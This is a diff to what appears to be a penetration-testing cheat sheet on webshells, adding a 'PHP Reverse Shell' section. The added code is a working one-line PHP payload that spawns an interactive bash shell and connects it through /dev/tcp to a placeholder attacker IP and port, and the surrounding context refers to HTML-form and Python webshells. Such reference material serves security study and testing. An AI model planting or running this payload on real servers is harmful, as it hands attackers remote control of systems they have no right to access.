@@ -40,6 +40,11 @@ A more interactive **webshell** can be created using an HTML form to execute com
 
 This script provides a simple web interface to execute system commands by entering them into the form field.
 
+## PHP Reverse Shell
+```php
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<own_ip>/<port> 0>&1'"); ?>
+```
+
 ## Python Webshell
 
 ```python
